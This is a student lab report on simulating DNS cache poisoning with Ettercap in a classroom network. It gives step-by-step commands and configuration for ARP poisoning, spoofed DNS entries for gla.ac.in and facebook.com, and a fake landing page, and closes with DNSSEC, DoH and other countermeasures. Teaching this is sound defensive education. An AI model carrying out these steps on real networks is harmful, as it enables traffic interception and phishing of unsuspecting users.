# Experiment 8: DNS Spoofing and DNS Security Measures
**Dev Singh Chauhan | Roll: 2415000502 | Section: 2_SA**

---

## Objective
Simulate a DNS Spoofing (DNS Cache Poisoning) attack using Ettercap in a controlled lab environment, redirect a victim to a malicious website, and study DNS security measures (DNSSEC, DoH, DoT) to prevent such attacks.

---

## Theory
The **Domain Name System (DNS)** translates human-readable domain names (like `gla.ac.in`) into IP addresses (like `104.21.5.10`).

In a **DNS Spoofing / Cache Poisoning Attack**, the attacker corrupts the DNS resolution process so that when a victim tries to visit a legitimate website, they are silently redirected to a **fake (malicious) website** controlled by the attacker. The fake site is usually crafted to look identical to the real one — used for **phishing, credential theft, or malware delivery**.

The attacker typically uses **ARP Spoofing** to position themselves as a Man-in-the-Middle (MITM), then injects forged DNS replies using a tool like **Ettercap** with the `dns_spoof` plugin.

### Lab Setup
| Role | Machine | IP |
|---|---|---|
| Attacker | Kali Linux | 10.31.81.71 |
| Victim | Windows | 10.31.81.122 |
| Gateway | Router | 10.31.81.1 |

---

## Tools Used
- **Kali Linux** (attacker)
- **Apache2** (to host the malicious website)
- **Ettercap** (for ARP spoofing + DNS spoofing)
- **Web browser** on victim machine

---

## Procedure (Lab Steps)

### Step 1: Create the Malicious Landing Page

This is the fake page the victim will see after spoofing.

```
sudo nano /var/www/html/index.html
```

Paste the following:
```html
<html>
<head><title>GLA - Login</title></head>
<body style="background:#0a0a0a;color:#00FFB2;font-family:monospace;text-align:center;">
<h1>Malicious Website - DNS Spoofed!</h1>
<h3>(27 April) Dev Chauhan</h3>
<p>You thought you visited gla.ac.in...</p>
</body>
</html>
```

Save and exit (`Ctrl+O`, Enter, `Ctrl+X`).

---

### Step 2: Start Apache Web Server (Hosts the Fake Page)

```
sudo service apache2 start
sudo service apache2 status
```

Verify locally on Kali:
```
curl http://127.0.0.1
```
You should see the "Malicious Website" HTML response.

---

### Step 3: Verify Network Connectivity from Victim → Attacker

On **Victim (Windows)** machine:
```
ping 10.31.81.71
```
Replies confirm the victim can reach the attacker's web server. This must work *before* spoofing — otherwise the redirect won't render anything.

---

### Step 4: Configure Ettercap DNS File

Open Ettercap's DNS spoof config:
```
sudo nano /etc/ettercap/etter.dns
```

Add these lines at the bottom (point target domains → attacker's IP):
```
gla.ac.in        A   10.31.81.71
*.gla.ac.in      A   10.31.81.71
www.gla.ac.in    A   10.31.81.71
facebook.com     A   10.31.81.71
*.facebook.com   A   10.31.81.71
```

Save and exit.

> Format: `<domain>  A  <attacker-IP>` — A record means IPv4 mapping.

---

### Step 5: Enable IP Forwarding

This lets the attacker forward packets between victim and gateway (so the victim doesn't lose internet entirely):
```
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
```
Or:
```
sudo sysctl -w net.ipv4.ip_forward=1
```

Verify:
```
cat /proc/sys/net/ipv4/ip_forward
```
Output should be `1`.

---

### Step 6: Launch Ettercap GUI

```
sudo ettercap -G
```

Steps inside Ettercap UI:
1. Select **Primary Interface** → `eth0` (or `wlan0`) → click ✓.
2. Click the three-dot menu → **Hosts → Scan for hosts**.
3. After scan completes → **Hosts → Hosts list**.
4. From host list:
   - Select **victim IP (10.31.81.122)** → click **Add to Target 1**.
   - Select **gateway IP (10.31.81.1)** → click **Add to Target 2**.

---

### Step 7: Start ARP Poisoning (MITM Setup)

1. Click **MITM menu → ARP Poisoning**.
2. Tick **"Sniff remote connections"**.
3. Click **OK**.

Bottom of Ettercap will show:
```
ARP poisoning victims:
GROUP 1: 10.31.81.122  98:BD:80:07:1B:83
GROUP 2: 10.31.81.1    FE:95:67:4A:BA:45
```

Now all traffic between victim and gateway flows through Kali.

---

### Step 8: Activate the dns_spoof Plugin

1. Click **Plugins menu → Manage Plugins**.
2. Scroll to **dns_spoof**.
3. **Double-click** it → an asterisk (*) appears next to it → plugin is active.

Output terminal at the bottom shows:
```
Activating dns_spoof plugin...
```

---

### Step 9: Test the Attack from Victim Machine

On the Victim (Windows) browser, visit:
```
http://gla.ac.in
http://www.gla.ac.in
http://facebook.com
```

Expected result → All these load the **malicious page hosted on Kali**, even though the address bar still shows the legitimate domain name.

Ettercap's bottom output panel will print:
```
dns_spoof: A [gla.ac.in] spoofed to [10.31.81.71] TTL [3600 s]
dns_spoof: A [www.gla.ac.in] spoofed to [10.31.81.71] TTL [3600 s]
dns_spoof: A [facebook.com] spoofed to [10.31.81.71] TTL [3600 s]
```

This proves the DNS reply has been successfully forged.

---

### Step 10: Verify on Victim Using Command Line (Optional Proof)

On Victim's Command Prompt:
```
nslookup gla.ac.in
ping gla.ac.in
```

Both will show the **attacker's IP (10.31.81.71)** instead of the real one — confirming cache poisoning.

---

### Step 11: Stop the Attack (Cleanup)

In Ettercap:
- **Start → Stop attack**
- **MITM → Stop MITM attack(s)**
- Close Ettercap.

Disable IP forwarding:
```
sudo echo 0 > /proc/sys/net/ipv4/ip_forward
```

Flush victim's DNS cache (on Windows):
```
ipconfig /flushdns
```

---

## Result
The DNS spoofing attack was successfully simulated in a controlled lab. The victim, while attempting to visit `gla.ac.in`, was silently redirected to the attacker's fake website hosted on Kali Linux at `10.31.81.71`. The attack demonstrates how an unprotected DNS resolution process can be exploited for phishing.

---

## Security Measures (DNS Protection)

| Measure | What It Does |
|---|---|
| **DNSSEC (DNS Security Extensions)** | Adds digital signatures to DNS records so the resolver can verify authenticity — forged replies are rejected. |
| **DNS over HTTPS (DoH)** | Encrypts DNS queries inside HTTPS traffic — attacker cannot read or modify them. |
| **DNS over TLS (DoT)** | Encrypts DNS queries using TLS on port 853. |
| **Use Trusted DNS Servers** | Prefer Cloudflare (1.1.1.1), Google (8.8.8.8), Quad9 (9.9.9.9) — they support DNSSEC validation. |
| **Static ARP Entries** | Prevents ARP poisoning, which is required as the entry point for DNS spoofing on LAN. |
| **HTTPS + HSTS on Websites** | Even if redirected, the certificate mismatch alerts the user. |
| **Endpoint Protection / IDS** | Tools like Snort detect suspicious ARP/DNS traffic patterns. |
| **Network Segmentation** | Isolates user traffic from untrusted devices on the LAN. |

---

## Quick Command Summary (For Last-Minute Revision)

```
# Setup malicious site
sudo nano /var/www/html/index.html
sudo service apache2 start

# Configure DNS spoof entries
sudo nano /etc/ettercap/etter.dns
# add: gla.ac.in  A  10.31.81.71

# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Launch Ettercap
sudo ettercap -G

# Inside Ettercap:
# 1. Scan hosts → Hosts list
# 2. Add victim → Target 1, gateway → Target 2
# 3. MITM → ARP Poisoning → OK
# 4. Plugins → Manage Plugins → activate dns_spoof

# Verify on victim
nslookup gla.ac.in
ping gla.ac.in
```

---

## Common Issues & Fixes

| Problem | Fix |
|---|---|
| Victim's browser shows "site can't be reached" | Apache not running on Kali → `sudo service apache2 start` |
| `dns_spoof` plugin not visible | Run `sudo ettercap -G` (must be root) |
| Spoofing not working | Check IP forwarding is enabled: `cat /proc/sys/net/ipv4/ip_forward` should be `1` |
| Victim still gets real site | Flush DNS cache on victim: `ipconfig /flushdns` |
| ARP poisoning fails | Verify victim and gateway IPs are correct in target list |
| Browser shows HTTPS warning | Spoofing only works over **HTTP**; HTTPS detects the forged certificate (this itself is a defense!) |
